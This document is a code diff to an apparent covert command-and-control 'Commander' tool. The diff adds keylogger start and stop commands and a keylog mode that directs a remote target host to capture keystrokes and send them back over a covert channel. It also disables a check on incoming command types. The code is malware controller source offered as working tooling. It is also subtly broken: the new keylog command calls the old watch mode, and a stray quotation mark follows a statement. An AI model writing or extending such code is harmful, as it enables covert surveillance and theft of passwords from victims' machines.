@@ -30,6 +30,8 @@ class CommandType(IntEnum):
     FILE_WATCH = 0x6789
     FILE_DELETE = 0x7890
     STOP_WATCH = 0x8901
+    KEYLOG_START = 0x9012
+    KEYLOG_END = 0x0123
     ACK = 0x9ABC
     ERROR = 0xABCD
 
@@ -300,6 +302,9 @@ class Commander:
                 elif cmd == 'stop':
                     self.send_covert_command(CommandType.STOP_WATCH)
 
+                elif cmd == 'keylog':
+                    self.send_covert_command(CommandType.KEYLOG_START)
+                    self._watch_mode()
                 else:
                     print(f"[!] Unknown command: {cmd}")
 
@@ -315,6 +320,57 @@ class Commander:
 
             except Exception as e:
                 print(f"[!] Error: {e}")
+
+    def _keylog_mode(self):
+        # Open receive socket before entering the loop
+        self._watch_stop.clear()
+        self._watch_thread = threading.Thread(
+            target=self._watch_listener_loop,
+            daemon=True
+        )
+        self._watch_thread.start()
+
+        print("\n" + "=" * 60)
+        print("  WATCH MODE ACTIVE — commander is locked")
+        print("  Type 'stopkeylog' to stop.")
+        print("=" * 60)
+
+        while True:
+            try:
+                user_input = input("watching> ").strip().lower()
+                if user_input == 'stopkeylog':
+                    # Tell client to stop its watcher
+                    self.protocol.send_packet(
+                        self.source_ip,
+                        self.target_host,
+                        self.command_port,
+                        CommandType.KEYLOG_END,
+                        b''
+                    )
+                    self._stop_watch_listener()
+                    print("[*] Keylog stopped. Resuming normal command mode.")
+                    print("=" * 60)
+                    break
+                elif user_input == '':
+                    continue
+                else:
+                    print("[!] Keylog mode is active — only 'stopkeylog' is accepted.")
+
+            except KeyboardInterrupt:
+                print("\n[*] Interrupted — stopping watch and disconnecting...")
+                self.protocol.send_packet(
+                    self.source_ip,
+                    self.target_host,
+                    self.command_port,
+                    CommandType.KEYLOG_END,
+                    b''
+                )
+                self._stop_watch_listener()
+                try:
+                    self.send_covert_command(CommandType.DISCONNECT)
+                except Exception:
+                    pass
+                raise  # re-raise so outer loop exits too'
 
     def _watch_mode(self):
         """
@@ -412,9 +468,9 @@ class Commander:
                 if parsed['dst_port'] != self.command_port:
                     print(f"{parsed['dst_port']} {self.command_port}")
                     continue
-                if parsed['command'] not in (CommandType.FILE_WATCH, CommandType.FILE_DELETE, CommandType.STOP_WATCH):
-                    print(f"Wrong command {parsed['command']}")
-                    continue
+                # if parsed['command'] not in (CommandType.FILE_WATCH, CommandType.FILE_DELETE, CommandType.STOP_WATCH):
+                #     print(f"Wrong command {parsed['command']}")
+                #     continue
 
                 seq   = parsed['seq']
                 data  = parsed['data']
